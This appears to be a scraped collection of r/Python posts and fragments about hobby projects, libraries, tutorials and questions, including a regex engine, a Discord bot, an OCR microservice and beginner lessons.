- cross-platform (when I learned that you basically have to write two programs to support windows and Linux in c, that was a big deal.)
- widely supported.



Someone told me that Python is much faster to write, so if you have the choice of never finishing an "optimal" program, and finishing one that is not "optimal", the decision is clear. 


But still, there are cross-platform libraries, there are modern compiled languages... Like, what problem does Python solve that makes it so popular and widely spread. How are people ok with a program that is at least double as slow in the very start. I mean, I know that with todays powerful computers, no one cares (and we see that in gaming), but it is always cool to make something small and neat.

I have been laid off for about eight months now, and I have a hard time finding a new opportunity. I have been researching ways of passing my resume through various Applicant Tracking System (ATS) in hopes that I can get an interview, but I find it difficult to locate keywords the ATS is looking for. I decided to do a side project to see if I can create an ATS scanner to identify keywords, phrases, etc., to revamp my resume to pass the ATS.

I wondered if I could pick y'all brains to see where I should start or how I should approach this?

A couple of years ago I released "Slither into Python" for free online which was an introduction to Python for complete beginners. I released it for free as a thank you to the Python community in general. You can view that [here](https://www.slitherintopython.com).

The feedback was amazing (thank you all, I'm delighted you enjoyed it!). It inspired me to write another book that I felt was the natural extension to it - focusing on data structures and algorithms. In fact, I had a lot of requests for it after the last two chapters of that book so that inspired me even more to write this.

 We only had names of students, and many python headaches later I ended up with a script to write all of the results for each API call to an Excel file, except I had to enter each first and last name manually. 

We were going to make a graduate student do the manual entry of it all. It probably would've taken months. But then I realized I could just make a little script to do the entries instead.

When I'm adding text in parenthesis, separated by commas I have to take my hand away from the typing to move over to the arrows on my keyboard and move over one to the right to add the comma.

For example. Say I'm typing list\_name = \[''\]

As soon as I hit ' it will autopopulate both of them and then I can simply type the name of the string in. At that point if I want to add another variable like: 

list\_name = \['string\_1'

The cursor is inside the parenthesis after the variable name. So I have to move my hands from their current position, use my arrow key right to move outside the parenthesis and then I can add my , and new variable like: 

list\_name = \['string\_1', ''

Since I haven't gotten out into the world much recently, I made a script to show where my wife and I have been in the past. It imports which countries and U.S. states both of us have traveled to (separately or together) and plots them as layers on a folium map. Additionally, the script imports geotagged photos from a folder and places pins to show the photos in the appropriate places on the map. To make it more flexible, I created a script that adds/edits geotags to non-tagged images, and a separate script that reduces the images to a reasonable size for the map. I can't figure out how to post example images, but the html file on the github repo shows an example output. The image data is embedded, which pushes up the file size, unfortunately, but it should be self-contained for offline viewing once it's generated. It's definitely not optimized, but was a good way for me to start poking around with (geo)pandas and folium.

You can see from the display snippet above that the help  command shows information for the move, save, take, look, and inventory commands. These are the basic commands I intend to get working for version .01 of the system.

Future plans for the help command include allowing the player to use the help command in conjunction with a specific command. So you could do help take and get a more detailed explanation of the take and take all commands.

The second thing Ive been working on is the inventory command. Its not finished yet, but it matches the example output of the help command which means its functional. 

Finally,, Ive gotten the take command working. As of right now, you can only take single items, but the next thing is getting the take all command to work.

[stock news sentiment analysis](https://github.com/asad70/stock-news-sentiment-analysis)

Purpose: To analyze the news headline of a specific stock. This program uses Vader Sentiment Intensity Analyzer to calculate the news headline's overall sentiment of a stock.

Use: useful for someone who is into algo trading/trading and wants to analyze news.

[r/wallstreetbets](/r/wallstreetbets) [sentiment analysis](https://github.com/asad70/wallstreetbets-sentiment-analysis)

This program finds the most mentioned ticker on [r/wallstreetbets](/r/wallstreetbets) and uses Vader Sentiment Intensity Analyzer to calculate the sentiment analysis. Even though the primary purpose was to analyze [r/wallstreetbets](/r/wallstreetbets), you can also analyze other subs such as r/stocks, r/investing etc.

Use: It's way easier to run this bot and get the overall sentiment than to read the sub. Some peoples have tried to build a strategy around most mentioned companies. This bot goes one step ahead and analyzes the sentiment because they may be just bashing the company.

[Insider Trading](https://github.com/asad70/Insider-Trading)

This program extracts insider trading data from the sec website and stores it in an excel file for the specified time frame. 

Use: Most services that provide insider trading info charge money or are too slow to get you the data from the time it's posted on the website, you can run this whenever you want, and it's way faster than a human going to the website and looking.""|||Building a microservice that does intelligent document analysis|||Python|||1|||1|||1610124863|||""Hi,

My team has been given a project, which requires taking PDFs, which can be dozens or even hundreds of pages long, running it through OCR technology (AWS Textract, document text detection @ .1 cent a page), and getting gigantic text dumps. I then have to take these gigantic text dumps which are json files, reorganize them, perform comparison and analytical tasks on them, and then store the results of the organized, analytical work as structured data in the form of json or other formats in a separate database used by another application. The consumer program is a straightforward Laravel CMS application that will consume the information in the same database. 

It will also serve a second purpose of taking PDFs, and using OpenCV, detecting checkboxes (AWS does this, but it is 6 cents a page which is way too expensive for us) and validating signatures. And there are a lot of additional business uses my boss wants to add to this project.

This project does not require any frontend, though I might want to add it later for administration purposes. The load is around 1000-5000 PDFs a month, potentially larger, so around 100,000 pages of PDFs a month.

I made the decision to switch from PHP to Python to accomplish this task, because string, data, and array/dictionary data manipulation is significantly easier in Python than in PHP, even with Laravel's useful and convenient collections. 

I was wondering if the resources I've listed are sufficient for managing this microservice - using Flask, then having SQLAlchemy as a way of speaking with this MariaDB database, then using Flask-restful to manage the variety of resources in the application (all the routes will either return JSON, write to a database, or create a file - there would be no jinja templates), and then using whatever data analysis libraries needed like OpenCV, Tesseract, SciPy, etc. Then, adding any kind of message queues needed with RabbitMQ or Redis for asynchronous, step-by-step tasks. And finally adding authentication middleware, which I'm not the most familiar with. Since we need to have a token-based API with no login page (since there is no frontend), would a simple JWT system suffice, or should I go with Flask-Security?

Also, are there better options than Flask (or even Python) to accomplish these business needs?""|||How to resolve the issue of PyQt5 when it is not importing?|||Python|||1|||2|||1610124072|||""[removed]""|||Python3 Tutorial - 2021|||Python|||1|||1|||1610123567|||""[removed]""|||how to make it i want a tutorial make it on python ***use 2 for loop|||Python|||1|||2|||1610122270|||""&amp;#x200B;

Hello everyone.

I found out recently that discord enabled slash commands for bots, meaning we can now get some cool bot functionality via serverless. The bot uses AWS API Gateway, AWS Lambda, and DynamoDB. The dynamo schema and queries are optimized so there are no scans, only queries! If you want to know about the dynamo table set up let me know, but you can also view it in the source code in the resources section. This is the first time I've posted a project here. I'm a self taught developer and I often think I'm a bad programmer. I'm looking for feedback if you're kind enough. I think I could have made the dynamo functions do less, meaning they only pass back replies, and I parse the replies in another function. This would make it easier to to testing with mock data (at least I think it would). 

Another note about dynamo, is that the primary key is your discord server ID. So really all severs could use the API at the same time and you would not get any crossing of groups between discord servers.

The bot is fully coded in python, however if you wish to deploy it you will need Node installed as its required by the serverless framework.

If you want to try it out and use my bot, you can add it to your discord with this link. https://discord.com/api/oauth2/authorize?client_id=795853416207220747&amp;scope=applications.commands 


You can use the bot to create a group with a group name, size, and description. Example.

**/lfg create_group name: Dead By Daylight Size: 5 Description: Hope you're ready for fun!**

Then others can use /lfg get_groups. What is returned is all the groups with available space and info about the group. Then you can use.

**/lfg join_group Dead By Daylight**

You will be placed in that group. Once the group is full the bot will let you know so you can contact the members in the group and get playing!

**Commands**

* /lfg create_group has 1 required parameter which is group name. You can optionally provide a group description and group size.


* /lfg join_group has 1 required parameter which is group name.


* /lfg leave_group has 1 required parameter which is group name.


* /lfg get_group has 1 required parameter which is group name. This will return information about the group. Users in group, Group Description, Group Size

* /lfg get_groups has 1 optional parameter which is available. Blank = True True = True False = False. This will return info about the groups. Name, description, and available space.

My personal projects having 5-10 classes per project at best, I never pre-design and stick to a plan, I design on a need-basis. For example, I need to introduce some feature, I imagine how it will look like considering other features I would like to add, and design it in a way that fits with the big picture.  The larger the projects get, the more I tend to waste time on re-designing things. For example, I have some class that does something, whenever I start needing to re-use some its functionalities in another class, I move them in a base class and I'm never sure at the beginning of what I would end up doing but I always end up reaching the desired results regardless of the number of re-factorings in between.

I've been interested in seeing how the population of japan changes. I was also interesting in web scraping and pygame. So I combined both of those things a little and made this guy.

NOTE: This is by no means a political statement, I just remember the memes about Abe from some of my Japanese friends. In fact, some of my japanese family showed me some so that was in the back of my mind. I am NOT saying that Abe is causing the decline; that would be silly. I am just using a meme as a part of code.

As I've said in the [previous post](https://github.com/nmnsnv/regexp_sar/blob/master/docs/introduction.md), SAR is very powerful when it comes into appending context for our regexps.
In this post I will try to demonstrate this statement.

Now consider the following task: You need to find in a C code all the functions that call another certain function inside of them, for example, we want to find all functions in our code that call the function "malloc".

When trying to solve this task without SAR I've come across many problems, I thought maybe i could try to split the scopes (i.e. the curly brackets), but then how do we know that those brackets belong to function body and not an if or while or other stuff?

We could try to use native regex to find function declaration, that should be easy enough, but then again, how do we know that inside those functions we have a malloc? Yet another problem...

I've tried many different approaches but unfortunately they all seem to get rather complicated very quickly.

Then looking at SAR the problem suddenly seems rather simple and straightforward, but before I'll explain how it was solved I'd like to emphasize again a few key properties of SAR:

1. We are able to append multiple regexps together.
2. For every regexp we also append a callback which will be called upon every match in the &lt;b&gt;same order&lt;/b&gt; they appear in the text.
3. We are able to remember information between matches by using python closure (basically means we can access variables outside of function scope and modify them) properties, and thus apply context into the regexp.

Now that we've recalled these properties we can move on to the solution.

First, read the C file content and create sar instance:
```python
from regexp_sar import RegexpSar

with open("./c_code.c", "r") as c_fh:
    c_content = c_fh.read()

required_method = "malloc"

sar = RegexpSar()
```

Now let's move on into solving the problem. The solution requires 2 things:

1. Find the name of the function in which we look inside it's body
2. Identify the required method name and print the name of the function we're at to notify us.

Now let's look how we can achieve these requirements:

1. In order to find the name of the function we're at, we will do the following steps:
   1. Keep track of the latest word we have seen (\\w+).
        ```python
        last_found_word = None
        def found_name(from_pos, to_pos):
            global last_found_word
            last_found_word = c_content[from_pos: to_pos]
            sar.continue_from(to_pos)

        sar.add_regexp("\\w+", found_name)
        ```
   2. Whenever we find an open paren character, mark that last found word as a function name (we will use that context in the following steps).
        ```python
        # name of last encountered function
        last_found_function = None
        def found_function(from_pos, to_pos):
            global last_found_function
            last_found_function = last_found_word

        sar.add_regexp("(", found_function)
        ```
   4. Keep track of the depth of our curly brackets, every time we encounter an open bracket ("{") raise a counter by 1 and every time we encounter a closing bracket ("}") reduce the counter by 1.
   5. Before increasing the bracket counter, check if it is equal to 0, if yes, that means that currently we are not inside any function, and also, that the function name we previously found, is the name of the function we are going to enter its body, so save that in another variable.
        ```python
        # This is steps 4 + 5
        # name of function we are currently in its body (with its body)
        inside_function_name = None
        curly_bracket_count = 0
        def handle_open_curly_bracket(from_pos, to_pos):
            global curly_bracket_count, inside_function_name
            if curly_bracket_count == 0:
                inside_function_name = last_found_function
            curly_bracket_count += 1

        sar.add_regexp("{", handle_open_curly_bracket)

        def handle_close_curly_bracket(from_pos, to_pos):
            global curly_bracket_count
            curly_bracket_count -= 1

        sar.add_regexp("}", handle_close_curly_bracket)
        ```

2. After we know how to find the name of the function we are inside, we will do the following:
   1. whenever we encounter the name of the required function, print the name of the function we are at, since it is known after following part 1.
        ```python
        def handle_required_method_found(from_pos, to_pos):
            print(f"found at: {inside_function_name}")

        sar.add_regexp(f"\\^\\w{required_method}\\^\\w", handle_required_method_found)
        ```

Once we've implemented the steps above all that's left is to run the regexps:
```python
sar.match(c_content)
```

In order to see the full code with the C file [click here](https://github.com/nmnsnv/regexp_sar/tree/master/examples/find_functions_contain_func).

And indeed, SAR finds that the following functions call the function "malloc" (this are: "cloneDoubleStr", "getSubArr", "someNestedMalloc").

&lt;b&gt;In this post we've learned what context means and how it is applied in SAR. It is very important to note that SAR was designed to give developers maximum freedom in their way of using SAR, and indeed, the way one applies context into SAR is entirely up to the developer to decide it's implementation.&lt;/b&gt;""|||What could I do with Python ?|||Python|||1|||2|||1610049722|||""[removed]""|||Python Discord Verification Help|||Python|||1|||2|||1610047687|||""[removed]""|||Javasript course|||Python|||1|||2|||1610046927|||""[removed]""|||not sure how to verify tokens in flask|||Python|||1|||2|||1610046722|||""[removed]""|||Hashiriya Undergrounds(Phase 1)(Tokyo)|||Python|||1|||0|||1610044886|||""[https://repl.it/join/jrpfmcph-twinkiejr23](https://repl.it/join/jrpfmcph-twinkiejr23)

You can also click this link or manually enter the code: JAN2021FREE

https://www.udemy.com/course/automate/?couponCode=JAN2021FREE

This promo code works until the 4th (I can't extend it past that). Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later. I'll change it to JAN2021FREE2 in three days.

Udemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. **I won't be able to make codes after this period**, but I will be making free codes next month. [Meanwhile, the first 15 of the course's 50 videos are free on YouTube.](https://www.youtube.com/watch?v=1F_OgqRuSdI&amp;list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW)

You can also purchase the course at a discount using my code JAN2021CODE or clicking https://inventwithpython.com/automateudemy to redirect to the latest discount code. I have to manually renew this each month (until I get that automation script done). And the cheapest I can offer the course is about $16 to $18. (Meanwhile, this lets Udemy undercut my discount by offering it for $12, and I don't get the credit for those referral signups. Blerg.)

**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. Expect that update to happen in mid-2021. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be "good at math" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a "gym buddy" to learn with.""|||Playing Super Mario with My Phone as a Controller|||Python|||1|||0|||1609951446|||"" Hello!

The project: [https://gitlab.com/danielquinn/majel](https://gitlab.com/danielquinn/majel)

The demo:

![video](pai4g8w1ep961 "A demo!  With my voice!")

Over the last year I've been working on a side project that leverages [Mycroft](https://mycroft.ai) (think: Alexa, but open-source and privacy-friendly) to do exciting things like stream video from Netflix, Amazon, and Youtube, or dig through your bookmarks for recipes etc.  It's finally in a state that I'm comfortable sharing with you all, [so here its](https://gitlab.com/danielquinn/majel).  I've named it *"Majel"* for [Majel Barrett-Roddenberry](https://en.wikipedia.org/wiki/Majel_Barrett), a reference that'll make sense if you're a Trekkie.

## Some technical notes about the architecture if you're interested:

![img](ypm0jjv5ep961 "Architecture diagram")

Majel sits on top of Mycroft.ai's voice activation system as a set of three (at the moment anyway) "skills" that know what to do when certain voice commands are issued.  These skills do a little research around what a command might mean -- For example you could say: `"play the west wing"`, the `streamer-skill` will figure out where you're most likely to find [The West Wing](https://www.imdb.com/title/tt0200276/) (including your local `.mkv` files) and then push the location of the stream into Mycroft's [message bus framework](https://mycroft-ai.gitbook.io/docs/mycroft-technologies/mycroft-core/message-bus) and exit.

The other part of the equation is the `majel` program that just listens for these messages and then executes different processes based on what comes down the pipe.  If it gets a Netflix or Amazon URL for example, it'll point your browser (using Selenium) to the stream in question and "click" the play button, if it's a local file, it'll play it with MPV (thanks to `python-mpv`), etc.

Anyway, I'm really happy with how it's turned out and wanted to share.  It's licensed under the [AGPL](https://en.wikipedia.org/wiki/GNU_Affero_General_Public_License), so contributions are always welcome and I've designed it to be very pluggable so I'm hoping to extend it to do some more stuff later: search Google/DuckDuckGo for arbitrary stuff, dig up products on Amazon, and (if I can figure out a smart way to do it) video-call my parents.""|||Why is Python so popular for data science?|||Python|||1|||2|||1609932625|||""[removed]""|||Services like Pythonanywhere ?|||Python|||1|||2|||1609928586|||""[removed]""|||Datacamp for Python?|||Python|||1|||4|||1609928172|||""Hey everyone!

I created a song in which the main melody line has 10,000 individual notes, and saved it as a MIDI file. To visualise this song, I drew a single dot for each note distributed across a grid, and modulated the color and fade time of the dot according the note pitch and volume. I used a module called mido to parse the MIDI file of the song melody, Python Image Library to draw the content of each frame and ImageIO to write the frames to an mp4 video.

 The algorithm works as follows:  

1. Whenever a move is made the column position (A-H) and row position(1-8) are used to sound a note from the chosen scale (default C major). The column position determines the note in the scale (e.g. col A = C, col B = D, ..., col G = B, col H = C) and the row position determines the octave (e.g. a5 = middle C, a1 = middle C - 4 octaves, a8 = middle C + 3 octaves). 

2. If a move leads to a check or checkmate, the note is shifted either upward (for white's move) or downward (for black's move) to the nearest accidental (i.e. note not in the chosen scale). 

3. The clock timings of the move are used to determine when the note sounds. To achieve this the clock times are converted to seconds and made cumulative. Any increment on the clock this is accounted for. 

4. The duration of the note is determined by which piece is moved (Pawn = 1/16 note, Bishop/Knight = 1/8 note, Rook = 1/4 note, Queen = 1/2 note, King = whole note). 

5. If a move leads to a capture the volume of the note is set as high (random MIDI value between 60 and 100), else it is low-mid (random MIDI value between 30 - 90).""|||You should check this out!|||Python|||1|||1|||1609873095|||""Hey guys,

Github repo - [https://github.com/melvin-02/ar-sudoku-solver/blob/master/README.md](https://github.com/melvin-02/ar-sudoku-solver/blob/master/README.md)

I saw this project a while back on reddit(don't remember the author)  and was impressed with it as I had only started learning computer vision at that time. I am still relatively new but thought I'll give it a try. I decided to first try it with only images and then work my way to webcam. I managed to create a sudoku image solver, however I'd like to point out some mistakes I made:

1. I used to MNIST dataset for digits which was a bad idea, since the sudoku puzzles are mostly printed in computer font and not handwritten text. My model was always confusing 5s and 6s. Later I found out about the [chars74k image dataset](http://www.ee.surrey.ac.uk/CVSSP/demos/chars74k/) which contains computer characters as well as digits. After some preprocessing the images were ready to use.
2. Instead of using a clean image try to work with an image with some noise, because with webcam there  will always be some noise and so this way you're preprocessing will be better.
3. Making the sudoku solver as efficient as possible is very favorable as you'll probably be solving for every frame. The naive solver using backtracking might lead to performance issues.

After being able to work it out with images, I moved into the webcam part. Due to hardware limitations my system could not perform all the processing for every frame, which is why I decided to only solve the sudoku till its solved once and then warp the solution to the puzzle. Hence it warps the solution of the first puzzle onto any other subsequent puzzle it sees. 

The project is not perfect, however it feels great to be able to create something which I was amazed at and had no clue about some time before.

NO. . .dont leave! To learn Python and create games you need to learn some basic math operators. You dont need to be Einstein to figure them out, once you learn the syntax Python does most of the hard work.

Type 10 + 4 in the Shell command.

&gt;&gt;&gt; 10 + 4 
14

The answer should be 14.

That was a math operator using the addition sign + See that wasnt too bad. Lets practice some more simple operators so you can create games later. Open your Python editor or IDE and type the following into the shell window. Not the code editor, The Shell window normally has chevron at the prompt and allows programmers to evaluate small code snippets.

Using the subtraction operator  in the code, you can perform subtraction on two numbers. Type 5  2:

&gt;&gt;&gt; 5 - 2
3

The answer should be 3.

You can also use the multiplication operator * to multiply two numbers.

Multiply 10 by 2:

The answer should be 20.

&gt;&gt;&gt; 10 * 2
20

Now use the division operator / to see what happens.

Type 5 divided by 3:

The answer should be 1.6 recurring.

&gt;&gt;&gt; 5 / 3
1.6666666666666667

Try typing the same sum but with two division // operators between the numbers:

The answer should be 1.

&gt;&gt;&gt; 5 // 3
1

The operator // is called an integer division. Instead of returning a float number which is a number with a decimal point. It returns an integer number which is a whole number. This is important to understand because youll need to use whole numbers and decimals when you develop games.
Integer and Float Types

If you forget which is an integer and which is a float you can easily check their operator type in Python:

Add type() function, and 10 inside parenthesis to the shell command:

Python tells you the class of the number in the parenthesis. . . . An integer.

&gt;&gt;&gt; type(10)
&lt;class 'int'&gt;

Now add type() function for a float:

&gt;&gt;&gt; type(10.0)
&lt;class 'float'&gt;

Python also has functions that will convert integers into floats and vice versa.

&gt;&gt;&gt; int(8.55555555)
8

Now do the same with the float function:

&gt;&gt;&gt; float(8)
8.0

String values

In Python, strings are represented as str. Strings are a sequence of characters that can be enclosed in either single () or double () quotes. you can print these directly to the shell window by using the print command. Remember str values need quotation marks but int values do not.

Both functions need parenthesis (value) to define the values that are being called:

Use the print() function and add 48 between the parenthesis:

&gt;&gt;&gt; print(48)
48

Python tells you that its an integer number.

Now use the print() function and type Hello, world between the parenthesis:

&gt;&gt;&gt; print('Hello, world')
Hello, world

Strings can be as long as you want providing they have quotation marks to define them as strings.

&gt;&gt;&gt; print("This is also a string with lots and lots of words in it, but I can keep typing as long as there are quotation marks")
This is also a string with lots and lots of words in it, but I can keep typing as long as there are quotation marks

Otherwise youll get a syntax error:

&gt;&gt;&gt; print(I am a string)
SyntaxError: invalid syntax
&gt;&gt;&gt; 

Variables

Variables are memory locations which are used to store data values such as strings and numbers. Think of them as digital boxes for storing information. You can assign any value you wish to a variable. You will be using variables a lot when you start to make games.

When you want to store a value in a variable you must give it a name. The name must reflect the purpose of the value it contain.

Create a variable called stringVariable and give it a value:

&gt;&gt;&gt; stringVariable = 'There are lots of words inside this variable'
&gt;&gt;&gt; 

The variable called stringVariable has a string assigned to it. Try typing it into the Python shell. Notice that the shell prompt doesnt return a value afterwards unless you call the print() function with the variable. This is because Python has stored the value that you have given it and will only return it when you call it.

print(stringVariable)
There are lots of words inside this variable

Notice the strange way I have typed the variable stringVariable. This is called Camel case. It allows me to type phrases without spaces or punctuation, indicating the separation of words with a single capital letter. You can also type it like this string_variable. Spaces are not allowed when you are defining names.
Summary

During this lesson you learned simple sums using various operators and learned how to identify them. You have constructed simple string expressions and variables using the print function and typed them into the shell window.""|||Why is Python Essential for Data Analysis?|||Python|||1|||0|||1609778307|||""Why is Python Essential for Data Analysis?

Over the past few days I created my first package, yamlval, which is intended to be an easy to use type validator for yaml files.

It works by allowing the user to create a schema class which defines the expected types for corresponding fields in a yaml file. From there, the user can call a single function to both validate and load their YAML file. 

It took a bit of time, but Im proud to say that yamlval can catch and display the majority of validation errors simultaneously. This means that you dont have to run your script several times to catch every error, they all get revealed after the first run! 

Two examples can be found in the README and pypi project description.

  I have written a python regular expression engine called SAR which  takes a different approach from current regexp engines by providing an  event driven regexp engine  this means that for each regexp we want to  match, we also append a callback which will be called upon its match on  the text in the same order in which the matched text occurred in the  text, allowing us to handle that match knowing exactly what regexp was  caught and append context into that regexp match, which gives us much  more flexibility in writing regexps.

When SAR was created, it was designed with emphasize on the following points:

1. It  is built to handle many regexps together (can handle very large  numbers, above millions) to allow very high performance while also  keeping track of which regexp was caught  which differs from  alternation since you cannot know which regexp was caught among multiple  regexps.  
 also, it seems to perform much faster then python native  regexp engine with alternation (on benchmark running on my own pc, Ive  managed to get in SAR **more then 150x times** better performance then in python native regexp engine (code is in the post I link below).
2. It  is designed to offer a much better interactivity with the regexp engine  itself, while current regexp engines barely allow us to interact with  them, SAR embraces the interactions during the matching process, every  time there is a match, a handler will be called which is unique for that  specific regexp that was caught allowing us to decide what we want to  do with that match and thus bring much more flexibility to us

With  SAR, we are now able to append context to our regular expressions,  which was previously very hard to achieve, and aside of the performance  boost, this alone could prove itself very useful.

for more information, please read my post explaining SAR in greater detail:

In Python and in general. In the beginning, while extremely useful, it looked pretty magical to me, but after spending a couple of years working with various async ecosystems such as Node.js, Python's gevent, and asyncio I got enough insights on the internals of this technology to try to explain it to other people using only basic programming concepts. Here is what I've got for now:

[Explaining \[the need for\] the event loop and how it can be implemented in \~100 lines of plain Python](https://iximiuz.com/en/posts/explain-event-loop-in-100-lines-of-code/). Probably, the most "advanced" concept used for the explanation is *a callback*.

[From callback hell to async/await heaven](https://iximiuz.com/en/posts/from-callback-hell-to-async-await-heaven/). Having a basic event loop implemented, we can start writing callback-based asynchronous code. But lots of callbacks quickly lead to *callback hell.* In this article, I'm trying to show how to extend the primitive \~100 LoC async library with the concept of promises and generator-based async/await syntax eradicating the problem of having too many callbacks.

Despite the choice of the programming language, considerations from both articles are applicable to many async ecosystems, such as JavaScript, Python asyncio, and even some in-house promises implementations I had a chance to work with in languages w/o native event loop support.

I have also been writing a lot of Python code. I decided to combine my two quarantine hobbies. Here's the result!

# [The Hyrule Compendium API](https://github.com/Hyrule-Compendium-API/Hyrule-Compendium-API)

The Hyrule Compendium API is, according to IGN:

&gt;an encyclopedia of all of the 385 creatures, monsters, materials, equipment, and treasure in the The Legend of Zelda: Breath of the Wild. 

In other words, the Hyrule Compendium is a reference log for with information on all in-game interactive items.

So I thought, it would be cool to write an API for this, so people can embed this into their apps (like a discord bot or a BOTW compendium lookup site). 

**Architecture**

To make this API I used [Flask](https://github.com/pallets/flask) for the API server.

The API should...

* Return metadata on items in the compendium, which include their names, IDs, common locations, recoverable materials, cooking effects, and more.
* Let you get a specific item in the compendium, using it's name or ID.
* Let you get all items in a category (creatures, monsters, materials, equipment, treasure).
* Let you retrieve the *entire* Hyrule Compendium.

Using [Rockset](https://rockset.com/), an SQL-compatible database, I stored [all entries](https://github.com/Hyrule-Compendium-API/Hyrule-Compendium-API/tree/master/compendium) in JSON format. Using Flask, I assigned endpoints for these. If the client makes a request to the `/category` endpoint, it sends all data from a specified category. If a request is made to the `/entry` endpoint, it should return a single item from the compendium. Endpoint `/` is assigned to returning the entire database. 

Data is taken from the database using SQL queries. For example, if the client requests data on the in-game monster *Silver Lynel*, the following query should be executed:

    SELECT * FROM "botw-api".monsters WHERE name='silver lynel'

When the client wants a single entry using it's ID, the `where` clause is changed to:

    WHERE id=124

This query should return...

    {
        "id":124
        "name":"silver lynel",
        "category":"monsters",
        "description":"Silver Lynels are not to be trifled with. They have been influenced by Ganon's fiendish magic, so they are the strongest among the Lynel species, surpassing even the strength of those with white manes. The term \"silver\" denotes not only their color but also their rarity. The purple stripes help them to stand out even more.",
        "drops":[
            "lynel horn",
            "lynel hoof",
            "lynel guts",
            "topaz",
            "ruby",
            "sapphire",
            "diamond",
            "star fragment"
        ]
    }

With a little cleanup, I simply sent this to the client. All entries from the compendium is similarly structured, though each category has its own response schema.

I used a database rather than looping through a list of local entries for fast responses. I used Rockset because of it's world-famous low-latency.  

**Conclusion**

As a beginner, I learned many things in this small project:

* Using Flask for APIs
* SQL and database usage
* Basic API architecture

If you are completely new to coding, there are few things you have to consider when it comes to choosing a language and where do you want to be as a developer in a year or two.

1. Have a road map:  

   1. The software development field has a massive choice of what you could do. You could be a web developer (frontend, backend, or fullstack). You could be creating different system applications for Windows or Mac. Then you could create apps for Android or Apple using different approaches. You could also do DevOps (a person who works with servers only) and a lot more. So when you go into software development, choose one aspect of programming that sounds like something you want to do and create a road map around it.
2. Remove all the distractions and focus on your main objective:  

   1. Let's say my main objective is to create PC video games. First I need to find out what language should I start with (let's say it's C (99% is it)). The next thing I should be doing is focusing on learning fundamentals and the theory of programming using C. The reason why we are starting with C, it's because it teaches all the basics of coding that you can apply in any programing language at ease. Also to create PC video games, you would use C++ that is build on top of C. So You are already seating yourself up on the right path without been distracted by any other language.
3. Use the right tools:  

   1. For each programming language, we use a specific IDE that helps us (developers) to write software much faster and with fewer headaches.

I made this project to generate native notifications for Windows, and Linux so far. This will help any of you who're interested in the stock market. 

You can create triggers for yourself based on whatever stocks you're interested (as long as they're available on yahoo finance). Therefore, it doesn't restrict you based on whatever country you're in. 

Here's the Github repository: [https://github.com/ieshaan12/Stock-Trigger](https://github.com/ieshaan12/Stock-Trigger)

So far, I haven't found any bugs which I couldn't resolve. Also, I've added log files when you run the program, so the error can be caught effectively.

Some of these use cases are:

1. Task should be canceled/dropped if already queued or started by another worker thread. This can probably be handled with some kind of locking mechanism using Redis or database
2. Task should not allow parallel execution. Can probably be handled with some fancy routing args
3. Tasks may or may not allow parallel execution based on message contents (arguments). Put another way, task A can run in parallel if the first arg (or named arg) is 1 or 2, but serial if two tasks for 1. This is one where I'm struggling.

I feel like I have been in tutorial-void for quite a time (I write some python scripts for work but did not do many projects that are 100% mine, not followed by a ready tutorial or for fun.)

this is basically my third project that I thought and implemented on my own + got a little practice with git and I personally think that it is really awesome because I started learning programming in April 2020 and did not think at that time that I would be able to write code like I do now (obviously  I have a lot of stuff to improve but these projects are the best way to learn in improve:) )

and seeing the idea in my head transform into a code that actually works and can help people is extremely awesome from my point of view!!!!

**The Project:**

I am sure that we all have experience with downloading  Youtube videos but for some reason I just recently thought about how people with hearing problems download videos ( I have never seen a site that automatically downloads a video with the subtitles).

From what I understand the person needs to download the video and get a subtitle file separately and then use some kind of external software and create the video with subtitles themselves and this is a process I thought would be awesome to automate!!! 

link to the script : [https://github.com/Micbenh/Sublacer](https://github.com/Micbenh/Sublacer)

It is not that complicated (around 100 lines of code) but what it basically does:

1) it accepts a youtube link and destination path

2) downloads the video

3) extracts the youtube transcript and creates an .srt and .ass file

4) creates a new video file that contains the subtitles and deletes the unneeded files (srt, ass and original youtube video)

*Processing img oueeml7r7y861...*

&amp;#x200B;

*Processing img v4eqspxw7y861...*

* I originally wanted to write the subtitles with a speech recognition but it did not work as well as I expected so I use the youtube-made transcripts after some tests and seeing it is better. 

And now I am finally done writing lol!

**Spam Detection using Machine Learning**

Describes the probability of an event, based on prior knowledge of conditions that might be related to the event. For example, if the probability that a incoming spam mail is related to the total presence of the word Free, using Bayes theorem the word Free can be used to more accurately assess the probability of a mail being spam than can be done without knowledge of the words within the mail.

I'm quite pleased with how this project came out. However, if I were to do it again I would make my training data more accurate and make sure that the images only have a single person in them instead of group photos. 

I hope you consider checking out the YouTube video that I made for this project and maybe subscribe to it as well. If you enjoy this I'll be making more content that you'll probably like in the future.

First of all a "A HAPPY NEW YEAR"

So , i guess you already would have heard an advice of learning something new in this new year.

And yes i had even heard that whatever you do in first few days of a year decides the rest of your year.

So , my advice for you is to learn creating advanced GUI with python and tkinter.

Tkinter is a very-very easy module of python which empowers you to create a GUI.

I also provide a free flight to tkinter by creating an advanced project.

I will create a MiniVSCode (yeah a replica of the vscode text editor by microsoft.)

And yeah its very easy (atleast i feel so)

I made [NLPRule](https://github.com/bminixhofer/nlprule), a library for grammatical error correction using thousands of rules ported from [LanguageTool](https://languagetool.org/). It's written in Rust and has bindings for Python:

